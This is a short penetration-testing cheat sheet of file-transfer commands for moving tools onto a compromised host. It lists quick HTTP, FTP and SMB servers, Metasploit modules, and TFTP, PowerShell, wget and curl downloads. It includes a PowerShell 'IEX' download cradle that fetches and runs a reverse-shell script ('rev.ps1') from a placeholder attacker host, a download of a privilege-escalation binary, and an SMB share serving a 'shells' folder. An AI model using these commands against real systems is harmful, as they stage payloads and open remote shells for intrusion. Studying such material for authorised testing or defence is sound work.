## Transfer files (HTTP)

python2 -m SimpleHTTPServer 8000

python3 -m http.server 8000

## Transfer files (HTTP)

php -S 127.0.0.1:8080

## Transfer files (FTP)

python3 -m pyftpdlib -p 21

## Transfer file (FTP/msf)

msf> use auxiliary/server/ftp

## Transfer file (TFTP/msf)

msf> use auxilitary/server/tftp

## Windows ( Download TFTP )

tftp -i xxx.xxx.xxx.xxx GET filename.exe\
tftp -i xxx.xxx.xxx.xxx PUT filename.exe

## Windows ( Enable TFTP)

pkgmgr /iu:"TFTP"

## SMB service (Impacket)

python smbserver.py SHARE /root/shells

# Mount windows fileshare                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                        New-PSDrive -Name "FolderName" -PSProvider "Filesystem" -Root "\\xxx..xxx.xxx\sharename"                                                                                                                                                                                                

## Copy files (SMB service)

copy \\\xxx.xxx.xxx.xxx\\SHARE .

## Windows ( Download HTTP )

powershell "IEX(New-Object Net.WebClient).downloadString('http://xxx.xxx.xxx:8000/rev.ps1')"

(new-object System.Net.WebClient).Downloadfile("http://xxx.xx.xx.xx:8000/1.exe", "1.exe")

powershell -command "& { iwr http://xx.xx.xx.xx:8000/potatos.exe -OutFile potatos.exe }"

## Linux ( Download HTTP )

wget -O filename http://xxx.xxx.xxx/filename

curl -o filename http://xxx.xxx.xxx.xxx/filename
